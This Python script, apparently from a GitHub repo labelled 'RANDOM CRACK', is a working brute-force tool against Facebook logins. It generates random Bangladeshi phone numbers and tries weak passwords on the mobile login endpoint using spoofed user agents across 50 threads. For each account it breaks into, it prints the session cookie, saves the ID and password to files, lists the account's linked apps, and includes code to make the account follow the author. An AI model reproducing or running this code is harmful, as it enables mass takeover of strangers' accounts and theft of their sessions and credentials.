#-------------------------------------------------------------
#Don't Forget To Follow My Github &
#Sent Star This Repositories 🙂
#-------------------------------------------------------------
#10K-Gift-Test-Coding
#!/usr/bin/python3
#-*-coding:utf-8-*-
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----[Global Functions]-----#
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#-----[Colours]-----#
RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
mtd,cp_cpx,cokix=[],[],[]
ugen2=[]
ugen=[]
#-----[App Checker]-----#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[😍] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🥵] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
           
#-----[UserAgent]-----#
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
         
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
#-----[Logo]-----#
logo = ("""
\033[1;92m ╦ ╦╔═╗╦ ╦╦═╗  ╔╦╗╔═╗╔╦╗╔╦╗╦ ╦  ╔╗ ╦═╗╔═╗
 \033[1;96m╚╦╝║ ║║ ║╠╦╝   ║║╠═╣ ║║ ║║╚╦╝  ╠╩╗╠╦╝║ ║
 \033[1;93m ╩ ╚═╝╚═╝╩╚═  ═╩╝╩ ╩═╩╝═╩╝ ╩   ╚═╝╩╚═╚═╝ \033[1;35m V 2.0
     \033[1;92m
 ┌─────────────────────────────────────────┐
 │ [\033[1;97m=\033[1;92m] 𝙰𝚄𝚃𝙷𝙾𝚁   : 𝙼𝙰𝚂𝚄𝙼 𝚂𝙾𝚁𝙳𝙰𝚁      	   │
 │ [\033[1;97m=\033[1;92m] 𝚃𝙾𝙾𝙻     : 𝚁𝙰𝙽𝙳𝙾𝙼 𝙲𝚁𝙰𝙲𝙺             │
 │ [\033[1;97m=\033[1;92m] 𝚂𝚃𝙰𝚃𝚄𝚂   : 𝙵𝚁𝙴𝙴             \033[1;91m    	   🫥
 \033[1;92m│ [\033[1;97m=\033[1;92m] 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 : 𝙳_𝙰𝙳𝙳𝚈_10                │
 │ [\033[1;97m=\033[1;92m] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 : 𝙼𝙰𝚂𝚄𝙼 𝚂𝙾𝚁𝙳𝙰𝚁             │
 └─────────────────────────────────────────┘""")
try:
   print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
   v = 5.2
   update = ('5.2')
   update = ('5.2')
   if str(v) in update:
       os.system('clear')
   else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')

def linex():
        print('\033[1;37m ──────────────────────────────────────────')
 
def clear():
    os.system('clear')
    print(logo)
    
#-----[Loop Menu]-----#  
loop = 0
oks = []
cps = []

#-----[Main-Menu]-----#
def mumit_menu():
	print(logo)
	print(50*'\033[93;1m━')
	print('\033[92;1m [1]\033[1;91m 𝚁𝙰𝙽𝙳𝙾𝙼 𝙲𝚁𝙰𝙲𝙺 ')
	print('\033[92;1m [2] 𝙲𝙾𝙽𝚃𝙰𝙲𝚃 𝙼𝙴 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 ')
	print(' [3] 𝙹𝙾𝙸𝙽 𝙼𝚈 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙲𝙷𝙰𝙽𝙽𝙴𝙻')
	print(50*'\033[93;1m━')
	bal = input('\033[1;97m𝙲𝙷𝙾𝙾𝚂𝙴 𝙾𝙿𝚃𝙸𝙾𝙽𝚂>>> ')
	if bal =='1':
		innocent()
	if bal =='2':
		os.system('xdg-open https://t.me/D_ADDY_10');time.sleep(1)
		os.system("clear")
		mumit_menu()
	if bal =='3':
		os.system('xdg-open https://t.me/HandCash999');time.sleep(1)
		os.system("clear")
		mumit_menu()
def innocent():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    os.system("xdg-open https://www.facebook.com/masum879?mibextid=2JQ9oc")
    print(logo)
    print('\033[1;32m [√] 𝙱𝙳 𝙲𝙾𝙳𝙴 : 017/019/016/018/013')
    linex()
    code = input('\033[1;32m [?] 𝙲𝙷𝙾𝙾𝚂𝙴 : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] 𝙴𝚇𝙰𝙼𝙿𝙻𝙴 : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] 𝙲𝙷𝙾𝙾𝚂𝙴 : '))
    linex()
    xd_cp=input(f'\033[1;32m [?] 𝚈𝚘𝚞 𝚆𝚊𝚗𝚝 𝚃𝚘 𝚂𝚑𝚘𝚠 𝙲𝚙 𝙰𝚌𝚌𝚘𝚞𝚗𝚝?[\033[1;32m𝚈\033[1;34m/\033[1;31m𝙽\033[1;32m]: ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
    else:cp_cpx.append('n')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as ahare:
        clear()
        tl = str(len(user))
        print('\033[1;32m [+] 𝙲𝙷𝙾𝙸𝙲𝙴  𝙲𝙾𝙳𝙴: '+code)
        print('\033[1;92m [+] 𝙲𝚁𝙰𝙲𝙺 𝙿𝚁𝙾𝙲𝙴𝚂𝚂 𝙷𝙰𝚂 𝚂𝚃𝙰𝚁𝚃𝙴𝙳')
        print('\033[1;92m [!] 𝚄𝚂𝙴 𝙵𝙻𝙸𝙶𝙷𝚃 𝙼𝙾𝙳𝙴 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿')
        linex()
        for fuck in user:
            pwx = [fuck,'bangladesh']
            uid = code+fuck
            ahare.submit(mumitx,uid,pwx,tl)
    print('𝙲𝚁𝙰𝙲𝙺 𝙿𝚁𝙾𝙲𝙴𝚂𝚂 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ')
    print('Ok Ids Saved in /INNOCENT-OK.txt')
    print('Cp Ids Saved in /INNOCENT-CP.txt')
    linex()
    
def mumitx(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
			 'method':'POST',
		     'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
		     'scheme':'https',
 		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 		     'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
		      'cache-control': 'max-age=0',
 		     'dpr': '3',
		      'sec-ch-prefers-color-scheme': 'dark',
		      'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		      'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
		      'sec-ch-ua-mobile': '?1',
 		     'sec-ch-ua-model': '"Infinix X676C"',
  		    'sec-ch-ua-platform': '"Android"',
		      'sec-ch-ua-platform-version': '"12.0.0"',
		      'sec-fetch-dest': 'document',
  		    'sec-fetch-mode': 'navigate',
 		     'sec-fetch-site': 'none',
 		     'sec-fetch-user': '?1',
		      'upgrade-insecure-requests': '1',
 		     'user-agent': pro,}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[𝙳𝙰𝙳𝙳𝚈-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[𝙲𝙾𝙾𝙺𝙸𝙴] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/𝙳𝙰𝙳𝙳𝚈-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[𝙳𝙰𝙳𝙳𝚈-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/𝙳𝙰𝙳𝙳𝚈-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96m𝙳𝙰𝙳𝙳𝚈\033[0;97m]..[\033[0;92m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

#-----[Run Menu]-----#
mumit_menu()